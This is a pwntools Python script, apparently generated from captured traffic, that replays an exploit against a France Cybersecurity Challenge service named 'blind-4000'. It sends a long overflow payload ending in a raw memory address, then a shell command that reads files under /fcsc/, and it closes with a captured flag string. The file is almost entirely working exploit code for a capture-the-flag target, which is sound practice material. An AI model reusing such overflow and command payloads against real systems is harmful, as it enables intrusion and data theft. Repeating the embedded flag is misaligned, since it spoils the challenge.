import json
import os

from pwn import *

"""
This file was generated from network capture towards 10.0.2.2 (TCP).
Corresponding flow id: 1793939755948903
Service: blind-4000
"""

# Set logging level
context.log_level = "DEBUG"  # or INFO, WARNING, ERROR

# Load environment variables
# EXTRA is an array of the flagids for current service and team
HOST = "challenges.france-cybersecurity-challenge.fr"

# Connect to remote and run the actual exploit
# Timeout is important to prevent stall
r = remote(HOST, 2111, typ="tcp", timeout=2)

# FIXME: You should identify if a flag_id was used in the following
# payload. If it is the case, then you should loop using EXTRA.
# for flag_id in EXTRA:
data = r.recvuntil(b'e note summary.\n')
r.sendline(b'n')
data = r.recvuntil(b'tUhkk\nContent: \n')
r.sendline(b'QBrIvOIptOA8nteBCh5Em27wu0W7vpgltV3dB5JoDuKIXKvWqtRqfZQ154nvcQnuBPruNChDti6N7KJl6hXK3fpOG8xM8deOYlXzsEOvkNpTmxntcN6k4UicnYWjNeIj9cSDOIY00nElFFsqtaFd1nUPAc80vsUOeJOQyZuHwsMCZGGWvRzs7dCDtAB0GfyzMPqFcBETKXDiRD9HBYLpvVx2nvApdt2wsFZZXgOv\xe5\x16@\x00\x00\x00\x00\x00\ncat /fcsc/ddJ565eGcAPFVkHZZFqXtrYe2vmVUQv/*')
data = r.recvuntil(b'422e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n')

# Use the following to capture all remaining bytes:
# data = r.recvall(timeout=5)
# print(data)

r.close()


FCSC_47d5ba1574be11ecbbfdcfac58fa8e8dcc8f010894f79b8615e4d746bc857d80